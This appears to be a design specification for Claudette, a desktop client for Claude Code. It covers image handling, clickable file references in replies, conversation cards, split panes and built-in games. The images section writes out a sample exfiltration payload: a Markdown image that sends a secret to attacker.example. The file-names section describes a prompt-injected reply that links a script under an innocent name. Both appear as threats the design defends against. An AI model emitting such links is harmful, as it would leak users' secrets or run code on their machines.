**Tests.** `ThreadTests` in Core; `ThreadTests` in the app (the hook delivering, holding, asking first, running out, letting other names through; one report for several sub-threads; prompts answered from the thread; the note; saving, restoring and closing; a message from another session); `ThreadUiTests` (the sidebar's rows, the strip); and `ThreadRealCliTests`, two tabs running the real `claude` against the mock API, whose `SEND_MESSAGE <to> | <message>` has the thread call `SendMessage`.

### Images from Claude's tools

✅ Built 2026-10-14: the images under tools' cards, and images in replies ([below](#images-in-claudes-replies)). Video is decided below, not built yet.

Claude doesn't make images or video, and it can't watch video: the Messages API has no video block, and Claude Code's Read refuses a video file as binary. What it does see is images its tools hand it, in the tool's result, and Claude Code passes those on in stream-json as base64 `image` blocks in the `tool_result` (checked against 2.1.299, live and in transcripts). Before this, Claudette dropped them, so a Read of a screenshot was an empty card.

- **Under the card.** A tool's result can hold images: a Read of an image file (PNG, JPEG, GIF or WebP), a PDF's pages read with `pages`, a notebook's figures, Bash output that's an image (a `data:image/…` URL, with `isImage` on its result; the card shows the image rather than the URL), and an MCP tool's image, such as a screenshot from Playwright, Chrome DevTools or Claude in Chrome. They show under the card's result line without expanding it, each at most 120 px high and 320 wide, keeping its shape and never larger than it is; several (a PDF's pages) wrap. A restored tab shows them too.
  - Each is named for what it is: a Read of an image by its file's name, a PDF's page as *report.pdf, page 3* (from `firstPage`), a notebook's figure as *analysis.ipynb, figure 2*, and anything else *Image* (*Image 2* of several). The name is its tooltip and, as *Open report.pdf, page 3*, its accessible name.
- **Full size.** A click opens it in a window of its own beside the conversation, titled with its name: at its own size, up to 1400 × 900 and 90% of the screen, and from then on any size, shrinking to fit but never growing past its own size until it's zoomed (**Zoom**, below). Esc closes it. Under the title: the tool, the type and size (*Read · PNG 245 KB*), and *scaled down from 3000 × 1000 to send* when Claude Code did (the Read's `dimensions`), since what's shown is what Claude saw.
  - **Copy image** puts it on the clipboard and says *Copied* for 1.5 seconds.
  - **Save as…** saves it under its name, with its type's extension: Claude Code may have sent a large PNG on as JPEG, which saves as *wide.jpg*. A save that fails says why under the title.
  - **Open**, for an image file Claude read, opens the file in the app the OS uses for it.
  - An animated GIF or WebP plays, with **Pause** and **Play** ([Opening images](#opening-images)).
  - The same window shows an image file or a web image clicked in the conversation or the explorer, as Settings → Files and diffs → **Open images in** says ([Opening images](#opening-images)).
- **Zoom.** ✅ Built 2026-10-21. The window opens fitting the image in, and zooms from 10% to 1600% of its own size, in steps: 10, 25, 33, 50, 67, 75, 100, 125, 150, 200, 300, 400, 600, 800, 1200 and 1600%.
  - **In the header**, at the right of the line under the title, below the buttons: **−**, the percentage it's shown at (*45%* fitting a large image, *100%* a small one), **+** and **Fit**, which is disabled while it fits. A step goes on from the percentage as it reads: fitting at 49.6%, which reads *50%*, **+** goes to 67%.
  - **The mouse wheel** over the image: each notch up is a step in and each notch down a step out, keeping the point of the image under the pointer where it is. A touchpad's smaller turns add up to a notch. On Windows a precision touchpad's pinch arrives as Ctrl and the wheel, so it zooms too.
  - **Keys**: `+` (or `=`, the same key) zooms in, `−` out and `0` fits, about the middle of the window, with Ctrl/Cmd or without, as the main window's zoom has them ([§3](#accessibility)); the number pad's `+`, `−` and `0` too.
  - **Zoomed**, the image keeps its size as the window changes size, with scroll bars once it's larger than the window. Then it drags about with the left mouse button, with Space held or not, as in other image apps, or with the middle button, and shows the move cursor over it. Space with the pointer over the image doesn't press the header button with the focus.
  - **Each window** opens fitting, whatever the last one was zoomed to. An animated image keeps playing as it zooms. **Copy image** and **Save as…** copy and save the image itself, not what shows.
  - Zoomed past its own size, it's smoothed as it's scaled, as a browser does, rather than showing its pixels as squares.
  - **Still to verify:** a touchpad's pinch on macOS (Avalonia's magnify gesture isn't handled) and the wheel and drag on real macOS and Linux desktops (so far on Windows and headlessly).
- **Left out.** Find and Export: an image has no text to find, and an export's tool line keeps its summary. A whole PDF read without `pages` arrives as a `document` block, not images: the card says what was read, as before.
- **Video** (decided, not built). A video attached to a message gets a note saying Claude can't watch video, in place of the binary-file refusal. A video Claude points at (through `SendUserFile` while the tab is connected to the Claude app, or an MCP tool's `resource_link`) gets a card with **Open**, which plays it in the OS's player. Claudette has no player of its own: Avalonia has no video control, and one would need libvlc on every platform.
- **How it's built.** Core reads a `tool_result`'s base64 image blocks into `ToolResultBlock.Images` (`MessageImage.FromBlocks`, which a transcript's attached images share), and `ToolImages` names them from the call's input and the Read's `tool_use_result` (`type` `image`, `parts` or `notebook`). `ConversationBuilder` puts them on `ToolUseItem.Images`. A thumbnail's click is `TabViewModel.OpenImageCommand`, which the shell answers with `Views/ImageWindow` over `ImageViewerViewModel` (`ShellViewModel.ShowImage`); `ImageFiles.Preview` and `ImageFiles.Full` decode them, and `IPlatformServices.SetClipboardImageAsync` copies. The zoom is `ImageViewerViewModel`'s (`Zoom`, a step or null to fit, and `FitPercent`, which the window tells it); `ImageWindow` puts the image in a `ScrollViewer`, sizes it for the step, and scrolls it so the point under the pointer stays put. `ToolImagesTests` (Core), `ToolImageTests` and `ImageZoomTests` (the app), `ToolImageUiTests`, `ImageZoomUiTests` (the keys, the wheel and dragging, in the rendered window), and `ToolImageRealCliTests`, where the real Claude Code reads a PNG through the mock's `READ_FILE`.

### Images in Claude's replies

✅ Built 2026-10-14.

A reply's Markdown can show an image: `![alt](address)`. LiveMarkdown loaded any such address by itself, from the web or the disk, through an HTTP client of its own. A reply can be prompt-injected through anything Claude read (a web page, an issue, a file in the project), and an image that loads by itself lets it send data out in the image's address (`![](https://attacker.example/?q=<secret>)`) just by being shown. So Claudette loads at once only what can't reach another machine:

- **At once:** a file in the tab's folder (the worktree, for a tab in one), when nothing on the way down from the folder is a link, which could lead anywhere; and a `data:` image in the reply itself. A relative path is the folder's, so a chart Claude just made shows.
- **On a click:** a web image (`http` or `https`), and a file anywhere else. Its placeholder has the alt text, *"Image from example.com, which loads only when you ask."* or *"Image at /tmp/chart.png, outside the tab's folder."*, the address as its tooltip, and **Load image** or **Show image**. A file elsewhere waits because some paths reach the network just by being looked up (`/net/<host>` on macOS), so deciding never touches the file system outside the folder.
- **Never:** a network path (`\\server\share\…`, `//server/…`, `file://server/…`), whose server Windows would hand the user's credentials, a link in the folder that says it goes to one, and any other scheme (`ftp:`, `javascript:`). The placeholder says why, with no button.
- **Loading.** A web image comes through Claudette's own client (`AppServices.Http`), with 30 seconds to arrive, timed by the injected clock. Either kind is at most 20 MB, as an attachment is, and must be a PNG, JPEG, GIF, WebP or BMP by its first bytes, whatever its name or the server says ([Opening images](#opening-images), "Which images"). A failure says why (*"example.com answered 404 Not Found."*), and the button stays, to try again.
- **Remembered in the tab.** An address loaded once loads by itself in that tab from then on, and the last 32 images are kept, so a reply built again as it scrolls back into view shows them at once. Neither outlives the tab.
- **Shown** at most 480 px high and as wide as the conversation, never larger than it is. A click opens it full size in the image window ([above](#images-from-claudes-tools)), with **Save as…**, and **Open** for a file or **Open in browser** for a web image. An animated one stays on its first frame in the reply and plays in the window.
- **Wherever Markdown shows:** replies, plans, the Tasks page, and an agent's prompt and report. Outside a tab an image never loads.
- **How it's built.** `Views/ReplyLinkInlineNode` takes `LinkInlineNode`'s place in LiveMarkdown's pipeline (`MarkdownNode.Edit`, in `App.Initialize`): a link is as LiveMarkdown makes it, and an image is a `Views/ReplyImageView` over `ReplyImageViewModel`, which finds its tab once shown. The view sits in LiveMarkdown's `Link` span, so it takes the reply's text color and drops the link's underline. Core's `Protocol/ReplyImageAddress` decides where an address points, without looking outside the folder, and `Protocol/ReplyImageLoader` loads it; the tab's `Conversation/ReplyImages` remembers what was let load and what loaded. `ReplyImageAddressTests` and `ReplyImageLoaderTests` (Core), `ReplyImageTests` (the app) and `ReplyImageUiTests`, which checks that LiveMarkdown's own loader is never given an address and that nothing is requested before the click.

### Opening images

✅ Built 2026-10-18.

An image Claude pointed at by its file or its address opened in the OS's app, or the browser, though Claudette has a window for the images under tools' cards ([above](#images-from-claudes-tools)). Now it opens there too, as Settings → Files and diffs → **Open images in** says.

- **The setting.** Settings → Files and diffs → **Open images in**: **Claudette's image viewer** (the default) or **The app the OS uses for the file**, as it was before. It stays on each machine, as the other Editor settings do ([§14](#settings-sync-optional)).
- **Which images.** PNG, JPEG, GIF, WebP and BMP, which Skia decodes on every platform, up to 20 MB, as an attachment is. Its name says it's one, by its extension, and its first bytes have the last word: a `notes.png` that's text opens as any other file does, and so does an image over 20 MB. SVG, TIFF, PSD and the rest go to the OS's app.
  - A BMP is only ever shown: Claude can't be sent one, so an attachment still can't be one ([§5](#attachments)).
- **Which clicks.**
  - A file named in a reply, by a Markdown link or by inline code ([Files named in Claude's replies](#files-named-in-claudes-replies)), wherever Markdown shows.
  - **Open** in a tool card's detail, Changed files' **Open** and the diff window's (as **Open in the diff window** says, [§8](#8-file-changes--diff-view)), and a path in a project run's log ([Project tools](#project-tools), "A run's log").
  - A double-click or Enter in a [Project Files](#project-files) tab's explorer. A single click previews the file as before, so going down a folder of images opens no windows; the preview's note that it isn't text gains **Open in Claudette's image viewer**, for a file named as one of these images. That button opens it whatever the setting says, and one the window can't show after all goes to the OS's app.
  - A web link (`http`, `https`) whose address ends in one of their extensions. It loads as a reply's web image does ([Images in Claude's replies](#images-in-claudes-replies)): through Claudette's own client, with 30 seconds to arrive, at most 20 MB and an image by its first bytes. It's remembered in the tab the same way, so the same image in a reply then shows without asking. Nothing shows while it loads. Whatever else is there (a page, an error, too large an image) opens in the browser, as the link did before. Other web links go to the browser without a request.
  - Every menu keeps **Open in the OS's app**.
  - With **The app the OS uses for the file**, each of these goes where it went before.
- **What doesn't follow the setting.** A tool's image and an image shown in a reply open in the window either way: many aren't files (an MCP tool's screenshot, a `data:` image), and the window has **Open** for those that are.
- **The window** is the one a tool's image opens in, a new one for each click. Under its title, where the image is (`docs/menu.png` in the tab's folder, its whole path elsewhere, `example.com` for a web image), then its type and size. **Open** opens a file in the OS's app; a web image has **Open in browser** instead, as a reply's web image now does too.
- **Animation.** An animated GIF or WebP plays in the window, and only there. Thumbnails under tools' cards and images in replies stay on their first frame: a long conversation of moving pictures distracts, and costs the CPU.
  - Each frame shows for as long as it says, except that one of 10 ms or less shows for 100 ms, as browsers do, since GIFs made to play "as fast as possible" assume it. It plays as many times as it says (a GIF without a loop count, once) and stops on its last frame.
  - **Pause** and **Play**, beside **Copy image**. **Play** once it has stopped starts it from the beginning.
  - With motion reduced ([§3](#accessibility)), it opens still on its first frame, and **Play** plays it.
  - The details count its frames (*loop.gif · GIF 2.4 MB · 48 frames*). **Copy image** copies the frame showing, since the clipboard holds a still image. **Save as…** saves the file as it came, still animated.
  - A canvas over 64 million pixels stays still, since the one frame it keeps would be over 256 MB.
- **How it's built.** Core's `Protocol/ViewerImages` says which images Claudette shows (by extension, then by first bytes: `MessageImage.DetectMediaType`'s four, which attachments keep to, and BMP) and reads an image file. `ReplyImageLoader` and `ReplyImageAddress` use it too, so a reply's BMP shows. The shell opens the window for every view (`ShellViewModel.Images.cs`: `ShowImage`, and `ShowImageWindow`, which `ShellView` sets to `ImageWindow.Open`), so a click in a run's log or the explorer works while the tab's own view isn't on screen. `TabViewModel.OpenPathAsync` sends an image there before the editor is tried, `OpenWebImageAsync` loads a web link through the tab's `ReplyImages`, and the explorer's `OpenRowToStayAsync` and the note's `OpenFileInViewerCommand` do it for a Files tab. `Services/ImageAnimation` reads a GIF's or WebP's frames with SkiaSharp's `SKCodec` (a direct reference, at the version Avalonia.Skia takes), decoding one frame at a time into one buffer, over the frame before it where the codec allows. `ImageViewerViewModel` times the frames on the injected clock, and `ImageWindow` decodes each off the UI thread, dropping frames rather than falling behind. `ViewerImagesTests` (Core), `ImageOpeningTests` (the app, with GIFs and a BMP made byte by byte in `Support/TestImages`, and each frame's pixels checked) and `ImageOpeningUiTests`, which plays a GIF in the rendered window.

### Files named in Claude's replies

✅ Built 2026-10-15.

Claude names files as it works: *"`weapons.md` is written"*, *"see `docs/specs/weapons.md`"*, *"`Player.cpp:42`"*, or a Markdown link, `[weapons.md](docs/specs/weapons.md)`, the way Claude Code's VS Code extension asks it to. A click on any of them opens the file. Until now only web links did anything, so a file Claude pointed at had to be found by hand.

- **Which mentions.**
  - A Markdown link whose address is a path, relative to the tab's folder or not, or a `file:` address on this computer. A line or heading in it (`#L42`, `#guns`) is left out. It's a link as soon as it shows, as before.
  - Inline code that names a file or folder: a path (`docs/specs/weapons.md`, `src/utils/`, `~/.claude/settings.json`, `C:\Work\Game\Config\DefaultGame.ini`) or a name with an extension (`weapons.md`, `.gitignore`), with or without a line (`Player.cpp:42`, `:42:7`, `:42-51`, `#L42-L51`). It becomes a link only once its file is found, so code that only looks like a name (`System.IO.Path`) stays code, and code that can't be one (`Foo.Bar()`, `git add weapons.md`) isn't looked for. It keeps the code's look, underlined, with the hand pointer. Code inside a link stays code, so the link goes where it says.
- **Where the file is.** A path is read against the tab's folder (the worktree, for a tab in one), then its extra folders. A path with an environment variable in it is read with the user's environment, the one `claude` gets ([Login shell environment](#login-shell-environment)), in each shell's way: `%TEMP%\shot.png`, PowerShell's `$env:TEMP\shot.png`, and `$TMPDIR/shot.png` or `${TMPDIR}/shot.png`; `$HOME` is the user's home where it isn't set, as on Windows, and a variable that isn't set stays as it's written, so a file with a `%` or `$` in its name is still found. On Windows, a path as Git Bash writes it, which Claude Code runs its commands in there, is read as Windows has it: `/c/Work/Game/…` is `C:\Work\Game\…`, and `/tmp/…` is in the user's temporary folder, as Git for Windows has it. A name, or a path that isn't there from the folder (`specs/weapons.md`), is the file with that name the session's tools last read or changed, the main agent's or a subagent's; failing that, the project's files with it (the composer's `@` list: what git tracks, or a walk of the folder), the shallowest first.
- **A click.**
  - A file opens in the app the OS uses for it, as Changed files' **Open** does ([§8](#8-file-changes--diff-view)): Claudette isn't an editor ([§1](#non-goals-v1)). A line isn't passed on, since the OS's apps have no common way to take one.
    - With [Project files](#project-files), a file opens in Claudette's own editor instead, at the line named, unless Settings → Files and diffs says to use the OS's app. Scripts open there as text rather than showing in their folder, since showing their text doesn't run them.
    - An image (PNG, JPEG, GIF, WebP or BMP) opens in Claudette's image window, unless Settings → Files and diffs → **Open images in** says to use the OS's app ([Opening images](#opening-images)).
  - A folder opens in Finder, Explorer or the file manager.
  - A program, script, shortcut or installer (`.exe`, `.bat`, `.ps1`, `.js`, `.sh`, `.py`, `.lnk`, `.app`, `.desktop` and the like, or a file without an extension whose execute bit is set on macOS and Linux) shows in its folder rather than opening, since opening one runs it, and a reply can be prompt-injected to point at one under an innocent name (`[the spec](tools/setup.bat)`).
  - A name that matches several files offers them in a menu at the click, from the tab's folder (`docs/weapons.md`, `Plugins/Combat/weapons.md`); one is opened when it's picked, none when the menu closes.
  - A link to a file that isn't there adds a note: *"Couldn't find docs/specs/shots.md."*
- **What's looked at.** Inline code is looked for as the reply shows, without a click, and some paths reach the network just by being looked up (`/net/<host>` on macOS). So that lookup touches only the tab's folders, the user's home and, on Windows, the computer's own drives (not a mapped network drive); a path elsewhere becomes a link only when the session's tools named it. A click looks wherever its path points, as a click on an image elsewhere does ([above](#images-in-claudes-replies)). A network path (`\\server\share\…`, `//server/…`, `file://server/…`) is never looked at, since Windows would hand its server the user's credentials.
- **Remembered in the tab.** What inline code was found to name is kept (up to 512 names), so a reply built again as it scrolls back into view links at once. A click always looks again.
- **Wherever Markdown shows:** replies, plans, the Tasks page, and an agent's prompt and report.
- **How it's built.** Core's `Protocol/ReplyFileReference` reads a reference from inline code (`FromCode`) or a link's address (`FromLink`) and says what's a program (`IsProgram`), and `Protocol/ReplyFileFinder` finds the file, with the variables filled in (`ExpandVariables`, from the tab's `UserEnvironment`) and Git Bash's paths as Windows' (`FromGitBash`). `ConversationBuilder.FilePaths` lists the files the session's tools named, and the tab's `Conversation/ReplyFiles` remembers what was found. `Views/ReplyCodeInlineNode` takes `CodeInlineNode`'s place in LiveMarkdown's pipeline, beside `ReplyLinkInlineNode`; its `Views/ReplyFileCode` looks for the file once it's in a tab and then puts the code inside a link whose address is the code, escaped. A click on either kind reaches `TabViewModel.OpenLinkCommand`, as a web link's does, and the menu is `IPlatformServices.ChooseAsync`. `ReplyFileReferenceTests` and `ReplyFileFinderTests` (Core), `ReplyFileTests` (the app), and `ReplyFileUiTests`, which clicks inline code in a rendered reply.

### Conversation cards

✅ Built 2026-10-15, after [CodeAlta](https://codealta.github.io/)'s timeline. It replaced the Standard style's one-line rows, after the VS Code extension's, and the Claude style's bubbles.

Every step of the conversation is a card: a stripe down its left edge in its kind's color, over a faint tint of it inside a thin outline, a header line, and the step under it. The kind is always named on the card too, never told by its color alone.

| Card | Standard | Claude style |
|---|---|---|
| **You** | magenta | warm grey, as the Claude apps' bubbles |
| **Claude** | blue | Claude's orange |
| **Modified files** | green | blue |
| **Turn**, **Tasks** | slate | warm slate |
| Waiting on you (permission, question, plan, MCP input) | the caution colors | warm tints of the accent |
| **Error**, **Warning** | red, amber | red, amber |
| **Tool calls**, **Thinking**, subagents, **Hook**, **Note** | neutral | neutral |

- **The colors.** The stripes are the categorical palette's, checked with its validator, color blindness included, for every pair that can meet: magenta, blue and green in Standard, orange and blue in the Claude style. Green beside Claude's orange fails for protanopia in the dark theme, and aqua beside green fails for anyone, so the other kinds stay neutral and turn statistics slate. Each label is a darker step of its stripe on light and a lighter one on dark, at least 4.5:1 on its tint.
- **The header line:** an icon, the label in the kind's color, a few muted words (a Tool calls card's *"4 calls · 1 running"*, a subagent's task), the card's buttons while it's pointed at or has the focus (**Copy message**, **Add to scratch pad**, **⋯**), and its time at the right, short as a message's time is ([§5](#copy-and-times)). A one-line card (a note, a hook run, the turn's statistics, the tasks' summary, a Claude Doc) puts the step on its header line.
- **Tool calls.** Calls in a row share one **Tool calls** card. Anything between them ends it, and the next call starts another: a reply, thinking, a hook run, a prompt, a subagent, a task's start.
  - **Tiles** go three across, then two, then one as the card narrows (240 pixels each at least), and every tile in a row takes the tallest one's height.
  - **What a tile shows:** the call's status dot, icon, tool and time; what it worked on, a file by the end of its path (`…\Player\StarfallCharacter.cpp`), in full as its tooltip; how it went, *"Running…"*, *"120 lines · 0.3s"*, *"Failed · 2.1s"*, with an Edit's counts beside it; its output's first line; and its Claude Doc link, git chips and images.
  - **Opening one.** A click opens its detail under the tiles: the call in full, **Open** for the file it worked on (in Claudette's editor at the line, or the app the OS uses for it, per Settings → Files and diffs, [Project files](#project-files)), **Open diff** for a file change, **Open in a window**, and ×. One tile is open at a time, so opening another closes it. Find opens the tile its match is in.
  - **Replaced by its own card.** A question's or a plan's call gives its tile up to its own card, and a Tool calls card left empty goes with it.
  - **Subagents** are cards of their own, whose line opens the agent's own cards, its own Tool calls cards among them.
- **When a call ran.** A call takes the time it was made and the time its result came: live by the tab's clock, restored from its transcript entries. Under ten seconds the duration has a decimal, *"0.4s"*.
- **What the result says**, from the call's `tool_use_result` as the Agent SDK types it (Core's `Protocol/ToolOutput`): the lines a Read read (*"40 lines of 900"*), what a Grep found by its mode (files, lines or matches), a Glob's files (with a + when it cut the list), a fetch's status and size (*"200 OK · 14 KB"*), and whether a Write created the file or updated it. A field of another shape is left out ([§16](#16-tracking-claude-code-changes)). A Read's text is kept, up to 200,000 characters, for its detail and window.
- **The end of a turn.** After each turn, a **Modified files** card has a tile for each file it changed, laid out as a Tool calls card's are, with its name, its counts beside it and its folder under it, opening its changes in that turn ([§8](#changes-per-turn)). Under it, a **Turn** card has the duration, tokens in and out, the model, what came from the prompt cache, the tool calls every agent made, and when the turn ended. Restored turns have no footer, as before: a restore replays no turn's end.
- **Quieter in-between steps.** Settings → Conversation → **Quieter in-between steps** (on by default). The steps on the way lose their card's tint and outline, keeping the stripe, until they're pointed at or have the focus: tool calls, thinking, subagents, hook runs that didn't fail, notes, answered prompts, the turn's statistics, and a reply Claude carried on after, where a tool call followed it in the same turn. In Standard their text is softer too, at 88%, which keeps muted text at least 4.5:1. The Claude style's muted text is already as soft as it can be, so there only the tint and outline go. Your messages, Claude's answers, changed files, errors and waiting prompts stay as they are.
- **Collapsing tool calls.** A **Tool calls** card has a chevron before its icon: a click folds the card to its header line (*"› Tool calls · 4 calls · 1 running"*, with its time), and another brings the tiles back, so a long run of calls takes one line. It works as thinking does ([§5](#5-conversation-view)): Settings → Conversation → **Show tool calls collapsed** (off by default) says how new cards start, and right-clicking a card gives **Collapse all tool calls** and **Expand all tool calls**, which change every card in the tab and start the ones to come the same way, without changing Settings. The tab keeps that choice (`TabState.CollapseToolCalls`, null for the setting's), through a restart and into a copy of the tab. Changing the setting starts the cards to come its way and leaves the ones there as they are. Opening a call from elsewhere, as find does, opens its card. A running or failed call shows in the header's words (*"4 calls · 1 failed"*) either way. How it's built: `Controls/Card`'s `IsCollapsible`, `IsCollapsed` and `ToggleCommand` give the header its chevron (`PART_Toggle`), and the `:collapsed` pseudo-class drops the gap under the header; `ToolGroupItem.IsCollapsed` holds the state, and `ConversationBuilder.CollapseAllToolCalls` sets it on every group, subagents' too, as `ExpandAllThinking` does for thinking.
- **Indenting.** Two settings in Settings → Conversation, both off by default, so every card starts at the same edge. **Indent your messages**: like a chat's two sides, your messages' cards start far in from the left (96 pixels; 64 in Compact density), and Claude's replies stay at the left edge, so whose turn a card is can be told by its place alone, without reading its label or telling its color. **Indent Claude's steps**: the steps between Claude's replies, its thinking, tool calls and subagents, start a little in (24 pixels; 16 in Compact), so the replies stand out. Either can be on without the other. Every card still ends at the column's right edge, so none runs out of it. The cards keep their stripe, tint and label; only their left edge moves. The other cards (changed files, the turn's statistics, notes, hook runs, prompts waiting on the user) stay at the left edge. How it's built: the shell takes the `indentyou` and `indentsteps` classes, and styles give `Card.you`, and `Card.thinking`, `Card.tools` and `Card.agent`, their margins; Appearance's preview takes them too.
- **Marks in the scroll bar**, while the conversation scrolls, as Rider and VS Code mark theirs: your messages in the You color, waiting prompts amber, errors red, and turns that changed files in the Modified files color, in a lane as wide as the bar's thumb is drawn, the thin line at the bar's right while it rests and its whole width once it widens under the pointer, keeping the thumb's width as it widens and thins, and as tall as its track (between its arrows, where the thumb goes), over the track and the thumb. Each sits where its item is in the conversation's height. They take the pointer only on a mark, and not where the thumb is, so the thumb drags and the track pages as ever. The list lays out every item while the UI is idle ([§5](#5-conversation-view)), so the marks hold still as the conversation scrolls; for a moment after a long conversation opens, or its width changes, they settle as the items out of view are laid out. A click goes there, and the tooltip names it. Only the marks take the pointer, so the wheel and clicks reach the conversation under the strip.
- **From message to message.** `F3` and `F4` go to the previous or next of your messages and Claude's replies, from the one at the top of the view. One the top of the view cuts off counts as the previous: going back starts at its own top. `Ctrl/Cmd+F3` goes to the first message and `Ctrl/Cmd+F4` to the latest, as **Jump to latest** does. All four are rebindable ([§14](#keyboard-shortcuts)); the command palette has **Go to the first message** and **Go to the latest message**.
- **A call's window.** **Open in a window** follows the call: its title and state, and its running time, ticking each second by the tab's clock. It has two tabs, **Call** and **Details**.
  - **Call**, by the tool:
    - **Bash:** the command and its output. Claude Code sends a command's output only when it ends: `tool_progress` is a heartbeat every 30 seconds without output. So a running command shows its time, not its output. Bash's result has no exit code to show.
    - **Read:** the file as Claude read it, numbered from where it started, in the diff view's syntax colors, which follow the theme.
    - **Edit and Write:** this call's own change, with **Open diff** for the session's.
    - **Grep and Glob:** what they found, file by file, with a Grep's matching lines (its content mode's `path:line:text`).
    - **Anything else:** its arguments and its result.
  - **Details:** the arguments and the result, as the tool got and gave them.
  - One window per call: opening it again brings it to the front. `Esc` closes it.
- **How it's built.**
  - **The card:** `Controls/Card`, a content control whose template is in `Themes/ConversationStyles.axaml`. Its kind classes set its brushes (`Card*StripeBrush`, `Card*TintBrush`, `Card*OutlineBrush`, `Card*LabelBrush` in `App.axaml`, with the Claude values in `Themes/ClaudeColors.axaml`); `inline` puts the step on the header line, and `quiet` with the shell's `quietsteps` class quiets it.
  - **Tool calls:** `Conversation/ToolGroupItem` holds a run of calls, which `ConversationBuilder.AddToolCard` keeps; `Controls/TilesPanel` lays its tiles out. `Conversation/ConversationTree` walks cards and subagents for everything that looks through the conversation: find, export, scrolling to a card, the Processes page, message times.
  - **The marks and jumps:** `Conversation/ConversationLandmarks` says what's marked and where F3 and F4 go. `Controls/ScrollMarks` draws the marks from `ConversationPanel.TopOf` after each of its `Arranged`, and again when the scroll viewer takes in the list's new height, which it does after the list's arrange.
  - **The window:** `ViewModels/ToolCallWindowViewModel` and `Views/ToolCallWindow`.

### Split panes

✅ Built 2026-10-15.

Up to three tabs side by side, each pane with its own conversation, composer and working line, with a line between them. They share the width evenly until a line is dragged.

- **Opening them.**
  - A tab's menu has **Open beside**. The tab opens after the focused pane and takes the focus; with three panes, it takes the place of the last one without the focus.
  - **Dragging a tab's row** from the sidebar onto a pane opens the tab beside it, on the half it's dropped on, and the tab takes the focus.
    - With no room for another pane, it takes the place of the pane it's dropped on.
    - A tab already on screen moves there; on its own pane nothing happens.
    - While the row is over a pane, an outline in the accent marks the half, or the pane, it would take, saying *Open beside*, *Move here* or *Open here, in its place*.
    - Dropped back on the sidebar, it's selected, as a click would ([§4](#sidebar)).
  - A thread's menu has **Show with its sub-threads**: the thread and its first sub-threads, as many as fit beside it ([Threads](#threads)).
  - A project run's log is a pane's tab too, without a composer: its entry under its tab's row has **Open beside**, and can be dragged onto a pane ([Project tools](#project-tools), "A run's log").
  - The command palette has **Close this pane**, **Close the other panes** and **Show the thread with its sub-threads**.
- **Focus.** The selected tab is the focused pane's.
  - The keyboard's shortcuts, the command palette, the header (the account), Settings' project group and Claudette on the composer follow it.
  - A click or the focus in a pane focuses it.
  - Picking a tab in the sidebar focuses it when it's on screen; any other tab takes the focused pane's place.
  - Each pane has a header line with the tab's name, its folder and **Close pane**. A short bar before the name is in its group's color, as the group's line in the sidebar is, and the focused pane's header has that color under it, so each pane's project can be told without reading it. (The accent was under the focused one at first, which said which pane but not whose.)
- **On screen.** Every tab in a pane is on screen, as the selected tab is on its own: it starts its `claude`, its working line runs, its changed files and message times stay fresh, it isn't marked unread, and its notifications are skipped while Claudette is in front ([§10](#10-notifications)).
- **The tool windows** are the window's, outside the panes, and show the focused pane's tab's data, its name over them while another tab is on screen too ([Tool windows](#tool-windows)).
- **Room.** Each pane keeps the conversation's 360 pixels beside the sidebar and the tool windows (the strip, and the right side's least while a window shows there). Panes past that fold away, keeping the focused one and its neighbours, and come back as the window widens.
- **Resizing.** Drag the line between two panes to make one wider and the other narrower.
  - The two trade width. Each keeps the conversation's 360 pixels; the other panes stay as they are.
  - The line is drawn in the accent while it's pointed at or dragged. It takes hold a few pixels either side, more to its right, since the pane to its left has its scroll bar there.
  - A double-click on a line shares the width evenly again.
  - The shares are kept with the app state, for as many panes as there are. A pane opening or closing shares the width evenly again; panes folding away in a narrow window keep them for when they come back. Shares that would leave a pane under 360 pixels give way to even ones.
- **Closing.** **Close pane** takes a tab off the screen and leaves it open. Closing a tab takes its pane with it. Either way, the pane beside takes the focus if the one going had it.
- **Kept** with the app state and in the restart snapshot (`PaneTabIds`), so the panes come back.
- **Not covered:** panes stacked one over another.
- **How it's built.**
  - **The shell:** `ShellViewModel.Panes.cs` keeps the panes. `TabViewModel.IsShown` (in a pane) is apart from `IsSelected` (focused); outside a split, being on screen follows the selection, as before. `PaneDropFor` and `DropOnPane` are what a row dropped on a pane does.
  - **The tab:** `IsInSplit`, `PaneIndex` and `FocusPane`, and `IsDragged` for its row while it's dragged.
  - **The layout:** `Controls/PanesPanel` lays the panes out by `ShellLayout.PaneShares` (`ResizePanes`, saved as `PaneShares` in the app state), and `ShellLayout.MaxPanes` says how many fit. `Controls/PaneDividers` lies over the panes and takes the pointer only near the lines between them. `ShellView` carries the sidebar's drag out onto the panes and marks where a row would open.
  - **What follows it:** `NotificationService.ShownTabIds` skips notifications for every tab on screen, and `MascotLayer` reports Claudette shown only on the focused pane's composer.

### Games with Claudette

✅ Built 2026-10-15.

While Claude works, or a usage limit holds a task, the user can play a game against Claudette ([§5](#claudette-on-the-composer)): tic-tac-toe, Connect Four, hangman or Minesweeper. The games never touch Claude Code, use no tokens and reach nothing outside Claudette, and a game left open stays out of the way of everything else. Settings → Appearance → **Games with Claudette** (on by default, synced with the other Appearance settings) turns them off, and every way in with them; turning it off ends a game that's open.

- **Starting one.** Claudette's right-click menu has **Play tic-tac-toe**, **Play Connect Four**, **Play hangman** and **Play Minesweeper**, above **Hide Claudette**. The command palette has the same four, as *Play … with Claudette*. The usage limit bar ([§6](#continuing-after-a-limit-resets)) has **Play a game while you wait** until the limit resets. While Claude works or a limit holds the selected tab's task, one of her tips can be *"Right-click me for a game while you wait"*. Each shows the **Games** tool window.
- **One game at a time, for the whole app.** It follows the user from tab to tab, as she does: the Games tool window shows it whichever tab is focused. The window's icon is on the strip only while a game is open. **Done playing** on the page ends the game, and the page goes. The game's name beside the window's title in its header (*Games  Hangman ▾*) has a menu of the games, the one open checked, which switches to another; a round in progress is dropped, and not counted. It's in the header, rather than a row of games at the page's top, so the games can grow without crowding the board.
- **Tic-tac-toe.** The user is ✕ and Claudette ○, and whoever didn't start the last round starts the next. **Level**: Easy (she takes a win in front of her, and otherwise plays anywhere), Normal (she also blocks the user's wins, and plays her best move half the time) or Unbeatable (she never loses).
- **Connect Four.** Seven columns of six; a click on a column, or its number key, drops a piece in it. Who starts takes turns as in tic-tac-toe. The user's pieces are blue and hers berry, and the four that win are ringed. **Level**: Easy, Normal or Hard (she looks one, four or six moves ahead; on Easy she also plays anywhere a third of the time).
- **Hangman.** Claudette thinks of a word, three times in four from programming (*refactor*, *compiler*, *semaphore*) and otherwise an everyday one, and says which. The user guesses a letter by typing it while the page has focus, or with the letters under the word. Six misses draw the classic figure on the gallows, and lose; then she shows the word. She doesn't pick a word again until twenty others have come up, while Claudette runs.
